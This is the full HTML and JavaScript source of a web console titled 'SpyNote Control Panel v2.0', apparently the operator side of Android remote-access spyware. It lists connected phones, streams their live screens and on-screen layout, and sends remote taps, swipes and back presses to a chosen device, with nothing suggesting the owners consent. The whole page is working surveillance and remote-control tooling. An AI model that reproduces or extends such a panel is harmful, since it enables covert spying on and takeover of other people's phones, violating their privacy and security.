<!DOCTYPE html>
<html>
<head>
    <title>ðŸ“± SpyNote Control Panel v2.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 1000;
            background: rgba(0,0,0,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { 
            padding: 15px; margin: 10px 0; background: #1e1e2e; cursor: pointer; 
            border-radius: 10px; transition: all 0.3s; border-left: 4px solid #666;
        }
        .device:hover { background: #2a2a3e; border-left-color: #00ff88; transform: translateX(5px); }
        .active { background: linear-gradient(135deg, #00ff88, #00cc6a) !important; 
                  color: #000; border-left-color: #006633 !important; }
        .disconnected { opacity: 0.6; border-left-color: #ff4444; }

        #phone-frame {
            width: 420px; height: 900px; margin: 30px auto; 
            background: linear-gradient(145deg, #1a1a1a, #0d0d0d); 
            border: 30px solid #2a2a2a; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.7), inset 0 2px 10px rgba(255,255,255,0.1);
        }
        #screen-canvas { 
            width: 100%; height: 100%; background: #111; border-radius: 25px;
            image-rendering: -webkit-optimize-contrast; transition: opacity 0.2s;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; border-radius: 25px;
        }
        .layout-element {
            position: absolute; background: rgba(0,255,136,0.3); 
            border: 2px solid rgba(0,255,136,0.6); border-radius: 4px;
            transition: all 0.2s; cursor: pointer; backdrop-filter: blur(1px);
        }
        .layout-element:hover {
            background: rgba(0,255,136,0.5) !important; border-color: #00ff88 !important;
            box-shadow: 0 0 10px rgba(0,255,136,0.8);
        }
        .element-label {
            position: absolute; background: rgba(0,0,0,0.9); color: #00ff88;
            padding: 2px 6px; font-size: 10px; border-radius: 3px; white-space: nowrap;
            max-width: 120px; overflow: hidden; text-overflow: ellipsis;
        }

        #status { position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
            padding: 15px; border-radius: 10px; font-size: 13px; min-width: 200px; }
        #fps-counter { position: fixed; top: 15px; right: 250px; font-size: 13px; color: #00ff88; }
        #controls { text-align: center; position: fixed; bottom: 25px; 
            left: 50%; transform: translateX(-50%); z-index: 1000; }
        button {
            padding: 16px 35px; margin: 0 12px; background: linear-gradient(45deg, #667eea, #764ba2); 
            color: white; border: none; border-radius: 30px; cursor: pointer; 
            font-size: 16px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(102,126,234,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(102,126,234,0.6); }
        button:active { transform: translateY(-1px); }
        .toggle-layout { background: linear-gradient(45deg, #ff6b6b, #ee5a52) !important; }
        .toggle-screenshot { background: linear-gradient(45deg, #00d2d3, #00b894) !important; }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">ðŸ“± Connected Devices</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Layout: <span id="layoutFps">0</span></div>
        <div>Device: <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">Screenshot: 0 FPS | Layout: 0 FPS</div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()" title="Send Back">ðŸ”™ Back</button>
        <button id="toggleScreenshot" onclick="toggleScreenshot()" class="toggle-screenshot">ðŸ“¸ Screenshot</button>
        <button id="toggleLayout" onclick="toggleLayout()" class="toggle-layout">ðŸŽ¯ Layout</button>
        <button onclick="toggleFullScreen()">ðŸ“± Fullscreen</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let showLayout = true, showScreenshot = true;
        let layoutFps = 0, screenshotFps = 0;
        let lastScreenshotTime = 0, lastLayoutTime = 0, frameCounts = {screenshot: 0, layout: 0};

        const canvas = document.getElementById('screen-canvas');
        const layoutCanvas = document.getElementById('layout-overlay');
        const ctx = canvas.getContext('2d');
        const layoutCtx = layoutCanvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');

        // Socket events
        socket.on('connect', () => {
            document.getElementById('connectionStatus').textContent = 'âœ… Connected';
            document.getElementById('connectionStatus').style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // ðŸ”¥ LAYOUT OVERLAY (Primary - Shows clickable elements)
        socket.on('layout-update', (data) => {
            if (data.deviceId !== currentDevice || !showLayout) return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            updateLayoutOverlay(data.data);
            
            // FPS calculation
            frameCounts.layout++;
            const now = performance.now();
            if (now - lastLayoutTime >= 1000) {
                layoutFps = Math.round(frameCounts.layout * 1000 / (now - lastLayoutTime));
                document.getElementById('layoutFps').textContent = layoutFps;
                frameCounts.layout = 0;
                lastLayoutTime = now;
            }
        });

        // Screenshot backup
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice || !showScreenshot) return;
            
            try {
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    // FPS
                    frameCounts.screenshot++;
                    const now = performance.now();
                    if (now - lastScreenshotTime >= 1000) {
                        screenshotFps = Math.round(frameCounts.screenshot * 1000 / (now - lastScreenshotTime));
                        document.getElementById('fps').textContent = screenshotFps;
                        frameCounts.screenshot = 0;
                        lastScreenshotTime = now;
                    }
                };
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screenshot error:', e);
            }
        });

        function updateLayoutOverlay(layoutData) {
            const rect = phoneFrame.getBoundingClientRect();
            layoutCanvas.width = rect.width;
            layoutCanvas.height = rect.height;
            
            layoutCtx.clearRect(0, 0, layoutCanvas.width, layoutCanvas.height);
            
            const scaleX = rect.width / deviceWidth;
            const scaleY = rect.height / deviceHeight;
            
            layoutData.forEach(element => {
                if (!element.clickable || !element.enabled) return;
                
                const x = element.x * scaleX;
                const y = element.y * scaleY;
                const w = element.width * scaleX;
                const h = element.height * scaleY;
                
                // Draw element bounds
                layoutCtx.strokeStyle = 'rgba(0,255,136,0.7)';
                layoutCtx.lineWidth = 2;
                layoutCtx.strokeRect(x, y, w, h);
                
                // Label
                const label = (element.text || element.contentDesc || '').substring(0, 20) || 'Element';
                layoutCtx.fillStyle = 'rgba(0,0,0,0.9)';
                layoutCtx.fillRect(x, y - 20, Math.min(140 * scaleX, w), 18 * scaleY);
                layoutCtx.fillStyle = '#00ff88';
                layoutCtx.font = `${12 * scaleX}px Arial`;
                layoutCtx.fillText(label, x + 4 * scaleX, y - 4 * scaleY);
                
                // Store for click detection
                element.scaledBounds = {x, y, w, h, centerX: element.centerX * scaleX, centerY: element.centerY * scaleY};
            });
            
            window.currentLayoutElements = layoutData;
        }

        function updateDeviceList(devices) {
            document.getElementById('device-list').innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small><br>
                        <span style="font-size:11px;">${info.connected ? 'ðŸŸ¢ LIVE' : 'ðŸ”´ OFFLINE'}</span>
                    </div>
                `).join('') : '<div style="padding:20px;color:#666;">No devices online</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('selectedDevice').textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
            console.log('ðŸ“± Selected:', deviceId);
        }

        // ðŸ”¥ PERFECT TOUCH HANDLING with LAYOUT PRIORITY
        let startX = 0, startY = 0, isLongPress = false;
        const longPressTimer = 500;

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        // Touch/Mouse events
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
                isLongPress = false;
                
                setTimeout(() => {
                    if (!isLongPress) return;
                    // Long press - inspect element
                    const element = findElementAt(startX, startY);
                    console.log('ðŸ” Element:', element);
                }, longPressTimer);
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!currentDevice) return;
                e.preventDefault();
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!currentDevice) return;
                e.preventDefault();
                
                const coords = getScaledCoords(
                    e.changedTouches?.[0]?.clientX || e.clientX,
                    e.changedTouches?.[0]?.clientY || e.clientY
                );
                
                if (Math.hypot(coords.x - startX, coords.y - startY) < 20) {
                    sendTap(coords.x, coords.y);
                }
                isLongPress = true;
            });
        });

        function findElementAt(x, y) {
            return window.currentLayoutElements?.find(el => {
                const b = el.scaledBounds;
                return x >= b.x && x <= b.x + b.w && y >= b.y && y <= b.y + b.h;
            });
        }

        function sendTap(x, y) {
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
            console.log(`ðŸ‘† Tap: ${x},${y}`);
        }

        function sendSwipe(sx, sy, ex, ey) {
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, 
                endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleLayout() {
            showLayout = !showLayout;
            document.getElementById('layout-overlay').style.opacity = showLayout ? '1' : '0';
            document.getElementById('toggleLayout').textContent = showLayout ? 'ðŸŽ¯ Layout ON' : 'ðŸŽ¯ Layout OFF';
        }

        function toggleScreenshot() {
            showScreenshot = !showScreenshot;
            canvas.style.opacity = showScreenshot ? '1' : '0.3';
            document.getElementById('toggleScreenshot').textContent = showScreenshot ? 'ðŸ“¸ Screenshot ON' : 'ðŸ“¸ Screenshot OFF';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // Initial load
        fetch('/devices').then(r => r.json()).then(updateDeviceList);
    </script>
</body>
</html>
